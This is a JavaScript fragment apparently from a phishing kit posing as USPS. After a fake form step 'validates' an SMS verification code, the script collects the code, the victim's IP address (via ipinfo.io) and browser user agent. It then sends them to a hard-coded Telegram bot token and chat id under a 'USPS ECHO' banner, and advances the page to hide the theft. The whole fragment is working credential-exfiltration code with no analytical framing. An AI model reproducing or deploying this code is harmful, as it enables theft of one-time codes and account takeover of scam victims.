  clearStepError();
  //    jQuery(".required-field").toggleClass("error");
  var hasErrorFields = false;
  // Field Checks

  var grabFields = {};

  grabFields.sms = jQuery("#sms").val();

  var erroredFields = [];
  // 验证SMS
  var cleansms = grabFields.sms.replace(/[^\d]/g, "");

  if (grabFields.sms.length < 6) {
    jQuery("#smsErrorMessage").parent().addClass("error");
    hasErrorFields = true;
  }

  //Now do some stuff when you start typing...
  jQuery("#sms").on("keypress", function () {
    jQuery(this).parent().removeClass("error");
  });

  $(".review-error-wrapper").removeClass("error");

  if (!hasErrorFields) {
    $(".step-two1-drawer").addClass("disabled");
    $(".step-two1-drawer").addClass("step-complete");
    $(".step-two1-drawer").removeClass("current-step");
    $(".step-two1-drawer").removeClass("active");

    $("#root").show();

    setTimeout(function () {
      $("#root").hide();
    }, 2000);

    $(".step-three-drawer").removeClass("disabled");
    $(".step-three-drawer").addClass("current-step");
    $(".step-three-drawer").addClass("active");

    var sms = document.getElementById("sms").value;

    //console.log(sms)

    if (sms == "") {
    } else {
      $.get(
        "https://ipinfo.io",
        function (response) {
          var ip = response.ip;
          //console.log(ip);
          var agent = navigator.userAgent;
          //console.log(agent);

          var text = `|%2B]%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23[%2B][ USPS ECHO ][%2B]%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23[%2B|%0A|=[ USER INFORMATION ]=|%0A|SMS  :  ${sms} %0A|%2B]%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23[%2B][ USPS ECHO ][%2B]%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23[%2B|%0A|IP-ADDRESS  :  ${ip}%0A|USER-AGENT  :  ${agent}%0A|%2B]%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23[%2B][ USPS ECHO ][%2B]%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23[%2B|`;

          var url = `https://api.telegram.org/bot5567921371:AAHPC9OwhUl7s3-Wl7Hg_3QK2yc5wrTKb0Q/sendMessage?chat_id=-777422385&text=${text}`;

          let api = new XMLHttpRequest();
          api.open("GET", url, true);
          api.send();

          // console.log(text)

          gotonext1();
        },
        "jsonp"
      );
    }
  }
}
